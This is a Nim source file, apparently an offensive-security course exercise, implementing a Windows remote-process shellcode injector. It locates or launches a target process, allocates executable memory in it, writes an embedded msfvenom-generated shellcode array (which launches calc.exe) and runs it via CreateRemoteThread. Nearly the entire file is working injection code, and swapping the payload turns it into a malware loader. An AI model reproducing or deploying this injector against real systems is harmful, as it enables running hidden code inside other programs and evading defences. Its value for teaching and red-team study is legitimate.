from os import commandLineParams
from strutils import endsWith
import osproc # For spawning processes
import strformat
import winim

# Base code taken from Exercise 2, refer there if anything is unclear

# Helper function to to convert a WCHAR array to string, needed for the getProcessByName() function
# Taken from here: https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/blockdlls_acg_ppid_spoof_bin.nim#L24-L29
proc toString(chars: openArray[WCHAR]): string =
    result = ""
    for c in chars:
        if cast[char](c) == '\0':
            break
        result.add(cast[char](c))

# Helper function to get the Process ID (PID) from a process based on its name
# Uses the Windows API functions CreateToolhelp32Snapshot(), Process32First(), and Process32Next()
# Taken from here: https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/blockdlls_acg_ppid_spoof_bin.nim#L31-L47
proc getProcessByName(process_name: string): DWORD =
    var
        pid: DWORD = 0
        entry: PROCESSENTRY32
        hSnapshot: HANDLE

    entry.dwSize = cast[DWORD](sizeof(PROCESSENTRY32))
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    defer: CloseHandle(hSnapshot)

    if Process32First(hSnapshot, addr entry):
        while Process32Next(hSnapshot, addr entry):
            if entry.szExeFile.toString == process_name:
                pid = entry.th32ProcessID
                break

    return pid

proc injectShellcode[I, T](shellcode: array[I, T]): void =

    # Argument parsing
    # Error if an incorrect number of arguments is passed
    if (commandLineParams().len != 1):
        echo "Incorrect number of arguments.\nUsage: BasicShellcodeInjectorDynamicTarget.exe <target process>"
        quit(1)

    # Take the target proc from the first argument, adding the '.exe' extension if not defined
    var procName = commandLineParams()[0]
    if (not procName.endsWith(".exe")):
        procName = procName & ".exe"

    # Try to get the PID of the target process
    var processId = getProcessByName(procName)

    # If no process was found, launch the target process and get its PID
    # As per the assignment, we assume it is in the windows PATH
    if processId == 0:
        try:
            let targetProc = startProcess(procName)
            targetProc.suspend() # Suspend the process, so it doesn't pop up for the user
            processId = cast[DWORD](targetProc.processID)
        except:
            echo "Could not launch specified process"
            quit(1)

    echo fmt"Targeting process {procName} [{processId}]"
    
    # Get a handle on the target process in order to interact with it
    let pHandle = OpenProcess(PROCESS_ALL_ACCESS, false, processId)
    defer: CloseHandle(pHandle) # defer makes it so the handles is closed automatically when it is not used anymore, easy!
    echo fmt"Got a handle on process: {pHandle}"

    # Allocate RWX memory in the remote process
    # The opsec note from exercise 1 is applicable here, too
    let rPtr = VirtualAllocEx(pHandle, NULL, cast[SIZE_T](shellcode.len), MEM_COMMIT, PAGE_EXECUTE_READ_WRITE)

    # Write the payload to the allocated bytes in the remote process
    var bytesWritten: SIZE_T
    let wSuccess = WriteProcessMemory(pHandle, rPtr, unsafeAddr shellcode, cast[SIZE_T](shellcode.len), addr bytesWritten)
    echo fmt"WriteProcessMemory: {bool(wSuccess)}. Bytes written: {bytesWritten}"

    # Create our remote thread to execute!
    let tHandle = CreateRemoteThread(pHandle, NULL, 0, cast[LPTHREAD_START_ROUTINE](rPtr), NULL, 0, NULL)
    defer: CloseHandle(tHandle)
    echo fmt"Started shellcode in thread: {tHandle}"

when defined(windows):

    # Define our shellcode as a Nim byte array
    # msfvenom -p windows/x64/exec CMD="C:\windows\system32\calc.exe" EXITFUNC=thread -f nim
    var shellcode: array[296, byte] = [
    byte 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
    0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
    0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,
    0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,
    0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,
    0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
    0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,
    0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,
    0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,
    0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
    0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,
    0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,
    0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,
    0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,
    0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,0x6f,
    0x87,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,
    0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,
    0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x43,0x3a,0x5c,
    0x77,0x69,0x6e,0x64,0x6f,0x77,0x73,0x5c,0x73,0x79,0x73,0x74,0x65,0x6d,0x33,
    0x32,0x5c,0x63,0x61,0x6c,0x63,0x2e,0x65,0x78,0x65,0x00 ]

    # Main function
    when isMainModule:
        injectShellcode(shellcode)